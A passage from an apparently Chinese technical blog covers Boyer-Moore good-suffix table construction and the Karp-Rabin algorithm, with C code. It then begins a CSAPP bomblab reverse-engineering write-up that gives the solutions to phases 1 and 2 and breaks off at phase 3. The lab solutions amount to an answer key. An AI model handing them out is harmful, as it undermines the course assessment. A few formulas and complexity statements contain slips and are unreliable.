<p>与之前类似，位移量只取决于$j$和$P$本身，亦可预先计算并制表待查。</p>
<p><strong>gs表</strong></p>
<blockquote>
<p>蛮力算法</p>
</blockquote>
<p>根据以上定义，可导出gs表构造算法如下：</p>
<p>对于每个好后缀$P(j,m)$，按照从后向前($k$从$j-1$递减至0)的次序，将其与P的每个子串$P(k,m+k-j)$一一对齐，并核对是否出现匹配，一旦出现，对应的位移量即为$gs[j]$的取值。</p>
<p>这里共有$O(m)$个好后缀，可与$O(m)$个子串相互对齐，每次对齐后在最坏情况下需要比对$O(m)$次，因此该算法可能需要$O(m^3)$次。</p>
<p>实际上，仅需线性时间即可构造出gs表。</p>
<p><strong>ss表</strong></p>
<p>对于任一整数$j\in[0,m)$,在$P[0,j]$的所有后缀中，考查那些与P的某一后缀匹配者。若将其中最长者记作MS[j]，则$ss[j]$就是该串的长度$|MS[j]|$.特别地，在$MS[j]$不存在时，取$ss[j]=0$。</p>
<p>综上所述，可定义$ss[j]$如下：</p>
<p>$ss[j]=max{ 0\leq s\leq  j+1|P(j-s,j]=P[m-s,m)}$</p>
<p>特别地，当$j=m-1$时，必有$s=m$，此时，有$P(-1,m-1]=P[0,m)$</p>
<p>任一字符$P[j]$对应的$ss[j]$值，可分两种情况提供有效的信息：</p>
<ul>
<li>$ss[j]=j+1$ 也就是说MS[j]就是整个前缀，后缀长度应该大于$j+1$，所以此时对应于$P[m-j-1]$左侧的每个字符$P[i]$而言，$P[m-1]$下一步可与$P[j]$对齐，所以$m-j-1$都应是$gs[i]$取值的一个候选。</li>
<li>$ss[j] \leq j MS[j]$只是$P[0,j]$的一个真后缀。同时，既然$MS[j]$是极长的，故必有：$P[m-ss[j]-1]\neq P[j-ss[j]]$ ,此时的字符$m-j-1$也应是$gs[m-ss[j]-1]$取值的一个候选</li>
</ul>
<p>根据此前定义，每一位置i所对应的gs[i]值只可能来自于以上候选。</p>
<p><strong>ss表的构造</strong></p>
<p>由上可见，ss表的确是构造gs表的基础和关键，同样，若采用蛮力策略，则对每个字符$P[j]$都需要做一趟扫描对比，直到出现失配。如此，累计需要$O(m)$时间。</p>
<p>为了提高效率，不妨从后至前逆向扫描，并逐一地计算出各字符$P[j]$对应的$ss[j]$的值。</p>
<p>通过$lo,hi$来动态记录当前的极长匹配后缀：$P(lo,hi]=P[m-hi+lo,m)$</p>
<p>此时必有$P[j]=P[m-hi+j-1]$,故可利用此前已经计算的$ss[m-hi+j-1]$，分两种情况快速得导出$ss[j]$</p>
<ul>
<li>如图(a)所示，$ss[m-hi+j-1]\leq j-lo$,此时，$ss[m-hi+j-1]$也是$ss[j]$可能的最大取值，可直接得到$ss[j]=ss[m-hi+j-1]$。</li>
<li>如图(b)所示，$j-lo&lt;ss[m-hi+j-1]$，此时，至少仍有$P(lo,j]=P[m-hi+lo,m-hi+j)$,故只需将$p[j-ss[m-hi+j-1],lo]$与$P[m-hi+j-ss[m-hi+j-1],m-hi+lo]$做一比对，也可确定$ss[j]$。</li>
</ul>
<p><img src="https://i.loli.net/2019/09/11/JhYefNSm7dsBGEM.png"></p>
<p>由以上构思，可在$O(m)$时间内构造出ss表。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">buildSS</span> <span class="params">( <span class="keyword">char</span>* P )</span> </span>&#123; <span class="comment">//构造最大匹配后缀长度表：O(m)</span></span><br><span class="line">   <span class="keyword">int</span> m = <span class="built_in">strlen</span> ( P ); <span class="keyword">int</span>* ss = <span class="keyword">new</span> <span class="keyword">int</span>[m]; <span class="comment">//Suffix Size表</span></span><br><span class="line">   ss[m - <span class="number">1</span>]  =  m; <span class="comment">//对最后一个字符而言，与之匹配的最长后缀就是整个P串</span></span><br><span class="line"><span class="comment">// 以下，从倒数第二个字符起自右向左扫描P，依次计算出ss[]其余各项</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> lo = m - <span class="number">1</span>, hi = m - <span class="number">1</span>, j = lo - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j -- )</span><br><span class="line">      <span class="keyword">if</span> ( ( lo &lt; j ) &amp;&amp; ( ss[m - hi + j - <span class="number">1</span>] &lt;= j - lo ) ) <span class="comment">//情况一</span></span><br><span class="line">         ss[j] =  ss[m - hi + j - <span class="number">1</span>]; <span class="comment">//直接利用此前已计算出的ss[]</span></span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">//情况二</span></span><br><span class="line">         hi = j; lo = __min ( lo, hi );</span><br><span class="line">         <span class="keyword">while</span> ( ( <span class="number">0</span> &lt;= lo ) &amp;&amp; ( P[lo] == P[m - hi + lo - <span class="number">1</span>] ) ) <span class="comment">//二重循环？</span></span><br><span class="line">            lo--; <span class="comment">//逐个对比处于(lo, hi]前端的字符</span></span><br><span class="line">         ss[j] = hi - lo;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">return</span> ss;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>暂且忽略内循环，首先考查外循环，若将j作为其控制变量，则不难验证</p>
<ol>
<li>$j$的初始值为$m-2$</li>
<li>每经过一步迭代，$j$都会递减一个单位</li>
<li>在其他任何语句中，$j$都没有作为左值被修改</li>
<li>一旦$j$减至负数，外循环随即终止</li>
</ol>
<p>由此可知，外循环至多迭代$O(m)$步，累计耗时$O(m)$。</p>
<p>尽管从表面的形式来看，外循环的每一步都有可能执行一趟内循环，但实际上所有的内循环累计运行时间也不超过$O(m)$。为此，只需将lo视为其控制变量，则不难验证：</p>
<ol>
<li>$lo$的初始值为$m-1$</li>
<li>每经过一步内循环的迭代，$lo$值都会递减一个单位</li>
<li>在其他部分，$lo$只能在<code>lo=__min ( lo, hi )</code> 一句中作为左值被修改，但仍是非增</li>
<li>一旦$lo$减至负数，内循环就不再启动</li>
</ol>
<p>由此可知，内循环至多迭代$O(m)$步，相应地，累计耗时不过$O(m)$。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">buildGS</span> <span class="params">( <span class="keyword">char</span>* P )</span> </span>&#123; <span class="comment">//构造好后缀位移量表：O(m)</span></span><br><span class="line">   <span class="keyword">int</span>* ss = buildSS ( P ); <span class="comment">//Suffix Size table</span></span><br><span class="line">   <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ); <span class="keyword">int</span>* gs = <span class="keyword">new</span> <span class="keyword">int</span>[m]; <span class="comment">//Good Suffix shift table</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; m; j ++ ) gs[j] = m; <span class="comment">//初始化</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> i = <span class="number">0</span>, j = m - <span class="number">1</span>; j &lt; UINT_MAX; j -- ) <span class="comment">//逆向逐一扫描各字符P[j]</span></span><br><span class="line">      <span class="keyword">if</span> ( j + <span class="number">1</span> == ss[j] ) <span class="comment">//若P[0, j] = P[m - j - 1, m)，则</span></span><br><span class="line">         <span class="keyword">while</span> ( i &lt; m - j - <span class="number">1</span> ) <span class="comment">//对于P[m - j - 1]左侧的每个字符P[i]而言（二重循环？）</span></span><br><span class="line">            gs[i++] = m - j - <span class="number">1</span>; <span class="comment">//m - j - 1都是gs[i]的一种选择</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; m - <span class="number">1</span>; j ++ ) <span class="comment">//画家算法：正向扫描P[]各字符，gs[j]不断递减，直至最小</span></span><br><span class="line">      gs[m - ss[j] - <span class="number">1</span>] = m - j - <span class="number">1</span>; <span class="comment">//m - j - 1必是其gs[m - ss[j] - 1]值的一种选择</span></span><br><span class="line">   <span class="keyword">delete</span> [] ss; <span class="keyword">return</span> gs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以j为外循环的控制变量，则可知外循环至多迭代$O(m)$步，以i作为内循环的控制变量，可知内循环累计至多迭代$O(m)$步，累计耗时$O(m)$。</p>
<p>在模式枚举类应用中，需要从文本串T中找出所有的模式串P，有时允许两次出现的位置不超过m个字符。比如在000000中查找000，若限制多次出现的模式串之间至少相距3个字符，则应找到2处匹配，若不加以限制，则应找到4处匹配。在这种情况下，最坏情况下复杂度可能达到$O(nm)$。</p>
<p>可通过Galil规则对上述情况改进，总体耗时不致于超过线性的规模。</p>
<h2 id="性能分析-1"><a href="#性能分析-1" class="headerlink" title="性能分析"></a>性能分析</h2><p>空间复杂度为$|bc[]|+|gs[]|=O(|\sum|+m)$</p>
<p>预处理的时间为$O(|\sum|+m)$</p>
<p>查找在最好情况下为$O(n/m)$，最差情况下为$O(n+m)$</p>
<p>在通常情况下，单次比对的成功概率直接取决于字符集的规模。当字符集规模较小时，单次比对的成功概率较高，蛮力算法的效率低。此时，KMP算法稳定的线性复杂度更能体现出优势，而采用BC表的BM算法并不能大跨度地向前移动。</p>
<p>反之，若字符串的规模较大，则单词比对的成功概率较小，蛮力算法也可接近线性复杂l度，此时，尽管KMP算法仍然保持线性复杂度，但相对而言的优势并不明显，而采用BC表的BM算法则会因为比对失败概率的增加，从而大跨度地向前移动。</p>
<table>
<thead>
<tr>
<th></th>
<th>最好情况</th>
<th>最坏情况</th>
<th>特点l</th>
</tr>
</thead>
<tbody><tr>
<td>蛮力算法</td>
<td>$ O(n)$</td>
<td>$ O( nm )$</td>
<td>适用于规模较大的字符集，通常情况下实际运行效率不低</td>
</tr>
<tr>
<td>KMP算法</td>
<td>$ O(n+m)$</td>
<td>$O(n+m)$</td>
<td>适用于规模较小的字符集，字符集规模较大时与蛮力算法不相上下</td>
</tr>
<tr>
<td>BM算法(bc)</td>
<td>$O(n/m )$</td>
<td>$O( nm)$</td>
<td>适用于规模较大的字符集，性能浮动范围大</td>
</tr>
<tr>
<td>BM算法(bc+gs)</td>
<td>$O(n/m)$</td>
<td>$ O(n+m)$</td>
<td>四种算法中最优</td>
</tr>
</tbody></table>
<h1 id="Karp-rabin算法"><a href="#Karp-rabin算法" class="headerlink" title="Karp-rabin算法"></a>Karp-rabin算法</h1><p>将任一有限字符串视作自然数，进而在字符串和自然数之间建立联系。若字符串规模$|\sum|$ 对应于一个$d+1$进制的整数。</p>
<p>以由大写英文字母组成的字母表为例，若将这些字符表依次映射为[1,26]内的自然数，则每个这样的字符串都将对应于一个26+1=27进制的整数，比如：</p>
<p>$CANTOR \leq 3,1,14,20,15,18\geq43,868,727(10)$</p>
<p>以上散列并非满射，但是不含’0’的任一$d+1$进制值自然数，唯一地对应于某个字符串。字符串经如此转换得到的散列码，称为其指纹。之所以取$d+1$而不是$d$，是为了回避’0’字符以保证这一映射为单射，否则若字符串中存在由’0’字符组成的前缀，则无论该前缀长度如何，都不会影响对应的整数取值。</p>
<p>由此可将判断模式串是否与文本匹配的问题转换为判断T中是否由某个子串相同的指纹的问题，具体地，只要逐一取出T中长度为m的子串，并将其对应的指纹与P所对应的指纹一一比对即可确定是否存在匹配位置，称为karp-robin算法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">match</span> <span class="params">( <span class="keyword">char</span>* P, <span class="keyword">char</span>* T )</span> </span>&#123; <span class="comment">//串匹配算法（Karp-Rabin）</span></span><br><span class="line">   <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), n = <span class="built_in">strlen</span> ( T ); <span class="comment">//assert: m &lt;= n</span></span><br><span class="line">   HashCode Dm = prepareDm ( m ), hashP = <span class="number">0</span>, hashT = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; m; i++ ) &#123; <span class="comment">//初始化</span></span><br><span class="line">      hashP = ( hashP * R + DIGIT ( P, i ) ) % M; <span class="comment">//计算模式串对应的散列值</span></span><br><span class="line">      hashT = ( hashT * R + DIGIT ( T, i ) ) % M; <span class="comment">//计算文本串（前m位）的初始散列值</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> k = <span class="number">0</span>; ; ) &#123; <span class="comment">//查找</span></span><br><span class="line">      <span class="keyword">if</span> ( hashT == hashP ) </span><br><span class="line">         <span class="keyword">if</span> ( check1by1 ( P, T, k ) ) <span class="keyword">return</span> k;</span><br><span class="line">      <span class="keyword">if</span> ( ++k &gt; n - m ) <span class="keyword">return</span> k; <span class="comment">//assert: k &gt; n - m，表示无匹配</span></span><br><span class="line">      <span class="keyword">else</span> updateHash ( hashT, T, m, k, Dm ); <span class="comment">//否则，更新子串散列码，继续查找</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>算法除了预先计算模式串指纹hash(P)等预处理，至多包含$|T|-|P|=n-m$次迭代，每轮都需计算当前子串的指纹。</p>
<p>然而，若字符集规模较大，模式串P较长，其对应的指纹将很大。若指纹的长度无法在常数时间内完成，总体需要$O(nm)$时间。</p>
<h2 id="散列压缩"><a href="#散列压缩" class="headerlink" title="散列压缩"></a>散列压缩</h2><p>通过对比压缩后的指纹，确定匹配位置，借助散列将指纹压缩至存储器支持的范围。比如，采用模余函数：$hash(key)=key % M$</p>
<p>经过散列压缩后指纹比对的时间将仅取决于散列表长，而与模式串长m无关。</p>
<h2 id="散列冲突"><a href="#散列冲突" class="headerlink" title="散列冲突"></a>散列冲突</h2><p>hash()值相等，并非匹配的充分条件，压缩散列空间的时候必然引起冲突。文本串中不同子串的指纹可能相同，甚至都恰好与模式串相同。因此，通过hash()筛选之后，还须经过严格比对，方可确定是否匹配。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check1by1</span> <span class="params">( <span class="keyword">char</span>* P, <span class="keyword">char</span>* T, <span class="keyword">size_t</span> i )</span> </span>&#123; <span class="comment">//指纹相同时，逐位比对以确认是否真正匹配</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> m = <span class="built_in">strlen</span> ( P ), j = <span class="number">0</span>; j &lt; m; j++, i++ ) <span class="comment">//尽管需要O(m)时间</span></span><br><span class="line">      <span class="keyword">if</span> ( P[j] != T[i] ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//但只要散列得当，调用本例程并返回false的概率将极低</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>适当选取散列函数可大大降低冲突的可能。</p>
<h2 id="指纹更新"><a href="#指纹更新" class="headerlink" title="指纹更新"></a>指纹更新</h2><p>可根据前一子串和后一子串的指纹，在常数时间内得到后一子串的指纹。整个算法过程中，消耗与子串计算的时间，平均每次仅为常数时间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 子串指纹快速更新算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">updateHash</span> <span class="params">( HashCode&amp; hashT, <span class="keyword">char</span>* T, <span class="keyword">size_t</span> m, <span class="keyword">size_t</span> k, HashCode Dm )</span> </span>&#123;</span><br><span class="line">   hashT = ( hashT - DIGIT ( T, k - <span class="number">1</span> ) * Dm ) % M; <span class="comment">//在前一指纹基础上，去除首位T[k - 1]</span></span><br><span class="line">   hashT = ( hashT * R + DIGIT ( T, k + m - <span class="number">1</span> ) ) % M; <span class="comment">//添加末位T[k + m - 1]</span></span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &gt; hashT ) hashT += M; <span class="comment">//确保散列码落在合法区间</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">HashCode <span class="title">prepareDm</span> <span class="params">( <span class="keyword">size_t</span> m )</span> </span>&#123; <span class="comment">//预处理：计算R^(m - 1) % M （仅需调用一次，不必优化）</span></span><br><span class="line">   HashCode  Dm = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">size_t</span> i = <span class="number">1</span>; i &lt; m; i++ ) Dm = ( R * Dm ) % M; <span class="comment">//直接累乘m - 1次，并取模</span></span><br><span class="line">   <span class="keyword">return</span> Dm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>bomblab</title>
    <url>/systems/bomblab/</url>
    <content><![CDATA[<p>真相只有一个！从扑朔迷离的线索里推理出真相总是那么刺激。我们将在bomblab体会如何根据星星点点的线索，<del>胡乱假设</del>合理推断，大胆验证，从而揭开真相神秘的面纱。bomblab的场景为拆炸弹，任何一个输入不正确均会引发炸弹爆炸。根据二进制文件反汇编形成的汇编代码来推断应该输入的字符串，解锁6个关卡和待解锁的神秘关卡。</p>
<a id="more"></a>

<p><code>bomblab</code>链接地址：<a href="http://csapp.cs.cmu.edu/3e/bomb.tar">bomblab</a><br><code>gdb</code>指南：<a href="http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf">gdbnotes</a></p>
<p>首先反汇编得到bomb二进制文件对应的汇编代码<br><code>objdump -d bomb &gt; bomb.txt</code><br>将反汇编得到的汇编代码重定向到<code>bomb.txt</code>中</p>
<h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p><code>phase_1</code>对应的汇编代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400</span>ee0 &lt;phase_1&gt;:</span><br><span class="line">  <span class="number">400</span>ee0:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>          	sub    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">400</span>ee4:	be <span class="number">00</span> <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x402400</span>,%esi</span><br><span class="line">  <span class="number">400</span>ee9:	e8 <span class="number">4</span>a <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  <span class="number">400</span>eee:	<span class="number">85</span> c0                	test   %eax,%eax</span><br><span class="line">  <span class="number">400</span>ef0:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">400</span>ef7 &lt;phase_1+<span class="number">0x17</span>&gt;</span><br><span class="line">  <span class="number">400</span>ef2:	e8 <span class="number">43</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">400</span>ef7:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>          	add    $<span class="number">0x8</span>,%rsp</span><br><span class="line">  <span class="number">400</span>efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p>在地址0x400ee9处调用了string_not_equal函数，在调用之前将立即数0x402400存入了%esi中，%rsi为第二个参数所用寄存器，我们推测%rdi存储我们输入的字符串。<br>使用<code>gdb bomb</code>开始调试程序，在phase_1函数处设置断点验证。<br>观察到%rdi为地址的字符串正是我们输入的字符串。由函数名称<code>strings_not_equal</code> 推测该函数用于判断输入的字符串是否和0x402400处的字符串相等，使用<code>x/s 0x402400</code>显示0x402400处对应的字符串内容<br>“Border relations with Canada have never been better.”</p>
<h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p><code>phase_2</code>函数对应汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400</span>efc &lt;phase_2&gt;:</span><br><span class="line">  <span class="number">400</span>efc:	<span class="number">55</span>                   	push   %rbp</span><br><span class="line">  <span class="number">400</span>efd:	<span class="number">53</span>                   	push   %rbx<span class="comment">//被调用者保存</span></span><br><span class="line">  <span class="number">400</span>efe:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	sub    $<span class="number">0x28</span>,%rsp<span class="comment">//分配栈空间</span></span><br><span class="line">  <span class="number">400f</span>02:	<span class="number">48</span> <span class="number">89</span> e6             	mov    %rsp,%rsi<span class="comment">//保存栈顶指针</span></span><br><span class="line">  <span class="number">400f</span>05:	e8 <span class="number">52</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40145</span>c &lt;read_six_numbers&gt;   </span><br></pre></td></tr></table></figure>
<p>查看phase_2的汇编代码，第6行调用了<code>read_six_numbers</code> 来读入输入数据，根据函数名可知该函数应该是用于读入六个数字，接下来转到<code>read_six_numbers</code> 的汇编代码部分，推断读入的六个数存储在rsp开始的24个字节中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">000000000040145</span>c &lt;read_six_numbers&gt;:</span><br><span class="line">  <span class="number">40145</span>c:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>          	sub    $<span class="number">0x18</span>,%rsp<span class="comment">//分配栈空间</span></span><br><span class="line">  <span class="number">401460</span>:	<span class="number">48</span> <span class="number">89</span> f2             	mov    %rsi,%rdx</span><br><span class="line">  <span class="number">401463</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>e <span class="number">04</span>          	lea    <span class="number">0x4</span>(%rsi),%rcx</span><br><span class="line">  <span class="number">401467</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">46</span> <span class="number">14</span>          	lea    <span class="number">0x14</span>(%rsi),%rax</span><br><span class="line">  <span class="number">40146b</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">08</span>       	mov    %rax,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401470</span>:	<span class="number">48</span> <span class="number">8</span>d <span class="number">46</span> <span class="number">10</span>          	lea    <span class="number">0x10</span>(%rsi),%rax</span><br><span class="line">  <span class="number">401474</span>:	<span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>          	mov    %rax,(%rsp)</span><br><span class="line">  <span class="number">401478</span>:	<span class="number">4</span>c <span class="number">8</span>d <span class="number">4</span>e <span class="number">0</span>c          	lea    <span class="number">0xc</span>(%rsi),%r9</span><br><span class="line">  <span class="number">40147</span>c:	<span class="number">4</span>c <span class="number">8</span>d <span class="number">46</span> <span class="number">08</span>          	lea    <span class="number">0x8</span>(%rsi),%r8</span><br><span class="line">  <span class="number">401480</span>:	be c3 <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4025c3</span>,%esi</span><br><span class="line">  <span class="number">401485</span>:	b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">40148</span>a:	e8 <span class="number">61</span> f7 ff ff       	callq  <span class="number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">40148f</span>:	<span class="number">83</span> f8 <span class="number">05</span>             	cmp    $<span class="number">0x5</span>,%eax</span><br><span class="line">  <span class="number">401492</span>:	<span class="number">7f</span> <span class="number">05</span>                	jg     <span class="number">401499</span> &lt;read_six_numbers+<span class="number">0x3d</span>&gt;</span><br><span class="line">  <span class="number">401494</span>:	e8 a1 ff ff ff       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401499</span>:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>          	add    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">40149</span>d:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>在<code>read_six_numbers</code>返回后设置断点<code>break *0x400f0a</code>，输入<code>1 2 3 4 5 6</code>，执行后<code>x /32xb $rsp</code>查看rsp后32个字节的内容，如下所示，int大小为4个字节，以小端法存储</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7fffffffe3c0</span>: <span class="number">0x01</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x02</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffffffe3c8</span>: <span class="number">0x03</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x04</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffffffe3d0</span>: <span class="number">0x05</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x06</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br><span class="line"><span class="number">0x7fffffffe3d8</span>: <span class="number">0x31</span>    <span class="number">0x14</span>    <span class="number">0x40</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span>    <span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<p>接下来查看调用输入结束后的汇编代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">400f</span>0a:	<span class="number">83</span> <span class="number">3</span>c <span class="number">24</span> <span class="number">01</span>          	cmpl   $<span class="number">0x1</span>,(%rsp)<span class="comment">//将栈顶元素与1比较</span></span><br><span class="line"><span class="number">400f</span>0e:	<span class="number">74</span> <span class="number">20</span>                	je     <span class="number">400f</span>30 &lt;phase_2+<span class="number">0x34</span>&gt;</span><br><span class="line"><span class="number">400f</span>10:	e8 <span class="number">25</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">400f</span>15:	eb <span class="number">19</span>                	jmp    <span class="number">400f</span>30 &lt;phase_2+<span class="number">0x34</span>&gt;<span class="comment">//在explode_bomb调用返回后才会执行</span></span><br><span class="line"><span class="number">400f</span>17:	<span class="number">8b</span> <span class="number">43</span> fc             	mov    <span class="number">-0x4</span>(%rbx),%eax</span><br><span class="line"><span class="number">400f</span>1a:	<span class="number">01</span> c0                	add    %eax,%eax</span><br><span class="line"><span class="number">400f</span>1c:	<span class="number">39</span> <span class="number">03</span>                	cmp    %eax,(%rbx)</span><br><span class="line"><span class="number">400f</span>1e:	<span class="number">74</span> <span class="number">05</span>                	je     <span class="number">400f</span>25 &lt;phase_2+<span class="number">0x29</span>&gt;</span><br><span class="line"><span class="number">400f</span>20:	e8 <span class="number">15</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>       	callq  <span class="number">40143</span>a &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">400f</span>25:	<span class="number">48</span> <span class="number">83</span> c3 <span class="number">04</span>          	add    $<span class="number">0x4</span>,%rbx</span><br><span class="line"><span class="number">400f</span>29:	<span class="number">48</span> <span class="number">39</span> eb             	cmp    %rbp,%rbx</span><br><span class="line"><span class="number">400f</span>2c:	<span class="number">75</span> e9                	jne    <span class="number">400f</span>17 &lt;phase_2+<span class="number">0x1b</span>&gt;</span><br><span class="line"><span class="number">400f</span>2e:	eb <span class="number">0</span>c                	jmp    <span class="number">400f</span>3c &lt;phase_2+<span class="number">0x40</span>&gt;</span><br><span class="line"><span class="number">400f</span>30:	<span class="number">48</span> <span class="number">8</span>d <span class="number">5</span>c <span class="number">24</span> <span class="number">04</span>       	lea    <span class="number">0x4</span>(%rsp),%rbx</span><br><span class="line"><span class="number">400f</span>35:	<span class="number">48</span> <span class="number">8</span>d <span class="number">6</span>c <span class="number">24</span> <span class="number">18</span>       	lea    <span class="number">0x18</span>(%rsp),%rbp</span><br><span class="line"><span class="number">400f</span>3a:	eb db                	jmp    <span class="number">400f</span>17 &lt;phase_2+<span class="number">0x1b</span>&gt;</span><br><span class="line"><span class="number">400f</span>3c:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	add    $<span class="number">0x28</span>,%rsp</span><br><span class="line"><span class="number">400f</span>40:	<span class="number">5b</span>                   	pop    %rbx</span><br><span class="line"><span class="number">400f</span>41:	<span class="number">5</span>d                   	pop    %rbp</span><br><span class="line"><span class="number">400f</span>42:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>phase_2段的代码首先将rsp对应地址中存放的值与1比较，如果相等则跳过引爆炸弹的代码，那么首元素必定为1。<br>然后跳转至<code>400f30</code>处，将<code>rsp+0x4</code>与<code>rsp+0x18</code>的值分别存放到了rbx与rbp，此后跳转至<code>400f17</code>，将rbx的地址减4中存放的内容复制到了eax中，rbx的地址减4也就意味着与rsp相等，它的值也就是第一个读入的值。下一行将eax的值乘二，接下来将乘二后的值与rbx也就是第二个值进行比较，如果相同则跳过引爆代码。此后将rbx加4，指向下一个数存放的位置，一直循环直到rbx的值大于边界rbp的值为止。<br>可知，后一个数为前一个数的2倍时炸弹不引爆，输入的六个数分别为1，2，4，8，16，32</p>
<h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000400f</span>43 &lt;phase_3&gt;:</span><br><span class="line">  <span class="number">400f</span>43:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>          	sub    $<span class="number">0x18</span>,%rsp</span><br><span class="line">  <span class="number">400f</span>47:	<span class="number">48</span> <span class="number">8</span>d <span class="number">4</span>c <span class="number">24</span> <span class="number">0</span>c       	lea    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">400f</span>4c:	<span class="number">48</span> <span class="number">8</span>d <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>       	lea    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  <span class="number">400f</span>51:	be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>       	mov    $<span class="number">0x4025cf</span>,%esi</span><br><span class="line">  <span class="number">400f</span>56:	